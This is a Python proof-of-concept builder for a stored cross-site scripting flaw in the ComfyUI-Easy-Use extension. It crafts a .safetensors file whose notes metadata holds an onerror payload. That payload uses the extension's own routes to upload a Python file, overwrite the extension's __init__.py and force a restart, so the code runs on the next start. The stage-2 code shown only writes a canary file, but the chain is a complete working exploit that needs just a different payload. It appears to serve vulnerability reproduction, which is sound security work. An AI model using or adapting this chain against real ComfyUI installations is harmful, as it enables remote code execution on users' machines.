#!/usr/bin/env python3
"""make_poc.py -- build the artifacts for the ComfyUI-Easy-Use easyuse.notes live reproduction.

Root: comfy.easy_use_notes_staged_rce (yolain/ComfyUI-Easy-Use @ 450b1ce4ce43b2280521c87f5fa388a898fb2ad2,
ComfyUI @ 387f98aa2822f684b8597959a52a467d88cc4806).

Carrier: a metadata-only .safetensors placed in models/loras/. Its __metadata__["easyuse.notes"]
is rendered by the shipped v2 model info dialog (parseNote -> span{innerHTML}) once the dialog's
Civitai by-hash lookup returns 200. From that same-origin position the payload drives the
extension's own routes:

    POST /upload/image  (type=input)                      -> input/mbe2e_stage2.py
    POST /easyuse/save/custom_nodes%2F...%2F__init__.py   -> overwrites the installed initializer
    GET  /easyuse/reboot                                  -> os.execv, the product restarts itself

The overwritten initializer is the inert stage-2 sentinel: on import (the product's own startup
import of custom nodes) it writes STAGE2_CANARY.txt next to itself and exports empty mappings.

The negative artifact is the same construction with ordinary prose notes. A control handler
(<img onerror> that only sets an attribute) ships in BOTH notes: in the negative phase it proves
the page could have executed an injected handler and did not.

Payload hygiene (same rules the E2 harness used): no apostrophe and no double quote in prose,
no "http://" substring (parseNote extracts URLs into <a> elements), single-line note.
"""
import hashlib
import json
import pathlib
import struct
import sys

HERE = pathlib.Path(__file__).resolve().parent
OUT = HERE / "artifacts"

DOM_ATTR = "data-easyuse-notes"
TOKEN = "MBE2E-CANARY-comfy-easyuse-notes-stage2"
VICTIM_PKG = "ComfyUI-Easy-Use"
STAGE2_NAME = "mbe2e_stage2.py"
LORA_POS = "evil_notes_pos.safetensors"
LORA_NEG = "evil_notes_neg.safetensors"

# stage 2: the python file the product imports on its next start, after the overwrite.
STAGE2_PY = (
    "# stage 2 sentinel: this file replaced custom_nodes/%s/__init__.py, so ComfyUI\n"
    "# imports it during custom-node import on startup. It writes an inert canary\n"
    "# marker next to itself and exports empty node mappings.\n"
    "import pathlib\n"
    "p = pathlib.Path(__file__).resolve().parent / 'STAGE2_CANARY.txt'\n"
    "p.write_text(%r + chr(10), encoding='utf-8')\n"
    "NODE_CLASS_MAPPINGS = {}\n"
    "NODE_DISPLAY_NAME_MAPPINGS = {}\n"
    "__all__ = ['NODE_CLASS_MAPPINGS', 'NODE_DISPLAY_NAME_MAPPINGS']\n"
) % (VICTIM_PKG, TOKEN)

# control handler: ships in BOTH artifacts; only sets a DOM attribute.
CONTROL = ("<img src=y onerror=\"document.documentElement.setAttribute('"
           + DOM_ATTR + "-control','CONTROL_FIRED')\">")

# main vector: milestone chain, then the product's own routes.
def js_str(s: str) -> str:
    """Embed python source in a single-quoted JS string inside a double-quoted attribute."""
    return (s.replace("\\", "\\\\").replace("'", "\\'")
             .replace("\n", "\\n").replace('"', "&quot;"))


MAIN_JS = (
    "(function(){if(window.__mb)return;window.__mb=1;"
    "var D=document,S=function(v){D.documentElement.setAttribute('" + DOM_ATTR + "',"
    "(D.documentElement.getAttribute('" + DOM_ATTR + "')||'')+'|'+v)};"
    "S('XSS_RAN');"
    "var SRC='" + js_str(STAGE2_PY) + "';"
    "(async function(){try{"
    "var fd=new FormData();"
    "fd.append('image',new File([SRC],'" + STAGE2_NAME + "',{type:'text/plain'}));"
    "fd.append('type','input');fd.append('overwrite','true');"
    "var r1=await fetch('/upload/image',{method:'POST',body:fd});S('UPLOAD_'+r1.status);"
    "var r2=await fetch('/easyuse/save/'+encodeURIComponent('custom_nodes/" + VICTIM_PKG + "/__init__.py'),"
    "{method:'POST',headers:{'Content-Type':'application/json'},"
    "body:JSON.stringify({filename:'" + STAGE2_NAME + "',type:'input'})});S('COPY_'+r2.status);"
    "S('REBOOTING');fetch('/easyuse/reboot');"
    "}catch(e){S('ERR');}})();})()"
)

# second vector: srcdoc iframe (parsed by the iframe's own scripting context; survives a
# parent that was parsed inertly). Only in the attack artifact.
VECTOR_IMG = '<img src=x onerror="' + MAIN_JS + '">'
VECTOR_SRCDOC = ("<iframe srcdoc=\"&lt;script&gt;"
                 "parent.document.documentElement.setAttribute('" + DOM_ATTR + "-srcdoc','SRCDOC_FIRED');"
                 "&lt;/script&gt;\" style=\"display:none\"></iframe>")

PAYLOAD_NOTE = CONTROL + VECTOR_IMG + VECTOR_SRCDOC
BENIGN_NOTE = (CONTROL + "Thanks for downloading this style LoRA. Recommended weight 0.8.")


def write_safetensors(path: pathlib.Path, notes: str) -> None:
    """Official safetensors layout: <u64 header length><header json><data>.

    One harmless F32 tensor plus __metadata__. Plain JSON all the way; nothing here
    ever reaches a pickle loader.
    """
    header = {
        "__metadata__": {
            "easyuse.notes": notes,
            "modelspec.title": "easyuse notes repro",
        },
        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
    }
    blob = json.dumps(header, separators=(",", ":")).encode("utf-8")
    pad = (8 - (len(blob) % 8)) % 8
    blob += b" " * pad
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "wb") as f:
        f.write(struct.pack("<Q", len(blob)))
        f.write(blob)
        f.write(struct.pack("<f", 0.0))


def workflow(lora_name: str) -> dict:
    """One easy comfyLoader node (an Easy-Use loader); its right-click menu carries
    'View Lora Info...', the menu entry that opens the vulnerable dialog."""
    return {
        "last_node_id": 1,
        "last_link_id": 1,
        "nodes": [{
            "id": 1,
            "type": "easy comfyLoader",
            "pos": [80, 120],
            "size": [360, 430],
            "flags": {},
            "order": 0,
            "mode": 0,
            "inputs": [
                {"name": "model_override", "type": "MODEL", "link": None},
                {"name": "clip_override", "type": "CLIP", "link": None},
                {"name": "vae_override", "type": "VAE", "link": None},
                {"name": "optional_lora_stack", "type": "LORA_STACK", "link": None},
                {"name": "optional_controlnet_stack", "type": "CONTROL_NET_STACK", "link": None},
            ],
            "outputs": [
                {"name": "pipe", "type": "PIPE_LINE", "links": None, "slot_index": 0},
                {"name": "model", "type": "MODEL", "links": None, "slot_index": 1},
                {"name": "vae", "type": "VAE", "links": None, "slot_index": 2},
                {"name": "clip", "type": "CLIP", "links": None, "slot_index": 3},
                {"name": "positive", "type": "CONDITIONING", "links": None, "slot_index": 4},
                {"name": "negative", "type": "CONDITIONING", "links": None, "slot_index": 5},
                {"name": "latent", "type": "LATENT", "links": None, "slot_index": 6},
            ],
            "properties": {"Node name for S&R": "easy comfyLoader"},
            # positional values for the widgets the frontend actually renders:
            # ckpt_name, vae_name, clip_skip, lora_name, lora_model_strength,
            # lora_clip_strength, resolution, empty_latent_width, empty_latent_height,
            # positive, negative, batch_size (config_name and the token-normalization
            # combos are not rendered at this pin; verified live)
            "widgets_values": ["None", "Baked VAE", -2, lora_name, 1.0, 1.0,
                               "512 x 512", 512, 512, "", "", 1],
        }],
        "links": [],
        "groups": [],
        "config": {},
        "extra": {},
        "version": 0.4,
    }


def main() -> int:
    OUT.mkdir(parents=True, exist_ok=True)
    write_safetensors(OUT / LORA_POS, PAYLOAD_NOTE)
    write_safetensors(OUT / LORA_NEG, BENIGN_NOTE)
    for phase, lora in (("pos", LORA_POS), ("neg", LORA_NEG)):
        (OUT / ("workflow_%s.json" % phase)).write_text(
            json.dumps(workflow(lora), indent=2), encoding="utf-8")
    (OUT / "stage2_reference.py").write_text(STAGE2_PY, encoding="utf-8", newline="\n")

    lines = []
    for p in sorted(OUT.iterdir()):
        if p.is_file() and p.suffix in (".safetensors", ".json", ".py"):
            lines.append("%s  %s" % (hashlib.sha256(p.read_bytes()).hexdigest(), p.name))
    (HERE / "SHA256SUMS.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")

    for line in lines:
        print(line)
    print("notes payload bytes:", len(PAYLOAD_NOTE.encode("utf-8")))
    print("benign notes bytes:", len(BENIGN_NOTE.encode("utf-8")))
    return 0


if __name__ == "__main__":
    sys.exit(main())
